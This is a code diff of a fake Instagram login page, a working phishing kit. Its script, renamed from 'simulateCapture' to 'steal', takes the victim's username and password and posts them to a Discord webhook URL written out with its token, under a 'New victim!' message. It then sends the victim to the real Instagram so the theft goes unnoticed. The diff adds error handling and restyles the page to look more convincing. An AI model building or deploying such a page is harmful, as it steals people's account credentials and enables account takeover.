@@ -2,9 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Instagram</title>
+  <title>Instagram Login</title>
   <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
   <style>
     body {
       margin: 0;
@@ -12,6 +13,7 @@
       background-color: #fafafa;
       font-family: 'Roboto', sans-serif;
     }
+
     .container {
       width: 100%;
       max-width: 350px;
@@ -21,21 +23,12 @@
       border: 1px solid #dbdbdb;
       text-align: center;
     }
-    .app-icon {
-      width: 64px;
-      height: 64px;
-      border-radius: 14px;
+
+    .logo {
+      width: 150px;
       margin-bottom: 10px;
     }
-    .logo {
-      width: 175px;
-      margin-bottom: 20px;
-    }
-    .banner {
-      font-size: 14px;
-      color: red;
-      margin-bottom: 20px;
-    }
+
     input {
       width: 100%;
       padding: 10px;
@@ -45,6 +38,7 @@
       border: 1px solid #dbdbdb;
       border-radius: 3px;
     }
+
     button {
       background-color: #0095f6;
       border: none;
@@ -56,11 +50,13 @@
       border-radius: 4px;
       cursor: pointer;
     }
+
     .or-separator {
       margin: 20px 0;
       display: flex;
       align-items: center;
     }
+
     .or-separator::before,
     .or-separator::after {
       content: "";
@@ -68,6 +64,7 @@
       height: 1px;
       background: #dbdbdb;
     }
+
     .or-separator span {
       margin: 0 10px;
       color: #8e8e8e;
@@ -76,23 +73,13 @@
     }
   </style>
 </head>
+
 <body>
   <div class="container">
-    <!-- Instagram app icon -->
-    <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
-      alt="Instagram App Icon" 
-      class="app-icon">
+    <!-- Instagram logo (image) -->
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
 
-    <!-- Instagram text logo -->
-    <img 
-      src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
-      alt="Instagram" 
-      class="logo">
-
-  
-
-    <form onsubmit="simulateCapture(event)">
+    <form onsubmit="steal(event)">
       <input id="username" type="text" placeholder="Phone number, username, or email" required>
       <input id="password" type="password" placeholder="Password" required>
       <button type="submit">Log In</button>
@@ -103,18 +90,44 @@
   </div>
 
   <script>
-    function simulateCapture(e) {
-      e.preventDefault();
+    function steal(e) {
+      e.preventDefault(); // Prevent form submission to handle it in JS
+
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
-     fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ username: u, password: p })
-}).then(() => {
-  window.location.href = "https://instagram.com";
-});
 
+      // Create the payload to send
+      const data = {
+        username: u,
+        password: p
+      };
+
+      // Send the data to Discord webhook
+      fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🛑 New victim!\nUsername: ${data.username}\nPassword: ${data.password}`
+        })
+      })
+      .then(response => {
+        // Check if the request was successful
+        if (response.ok) {
+          console.log("Data sent successfully");
+          window.location.href = "https://instagram.com"; // Redirect to Instagram after success
+        } else {
+          console.error('Request failed with status:', response.status);
+          alert('Something went wrong. Please try again later.');
+        }
+      })
+      .catch(error => {
+        // Handle network errors
+        console.error('Error during fetch:', error);
+        alert('Network error. Please check your connection.');
+      });
+    }
   </script>
 </body>
 </html>
